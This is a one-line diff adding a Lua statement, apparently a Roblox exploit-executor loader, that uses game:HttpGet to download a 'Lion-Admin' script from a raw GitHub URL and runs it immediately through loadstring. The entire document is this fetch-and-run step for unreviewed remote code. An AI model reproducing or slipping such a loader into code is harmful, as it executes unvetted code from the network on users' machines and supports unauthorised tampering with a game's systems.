@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WCodesEz/Lion-Admin/main/v1.lua"))()
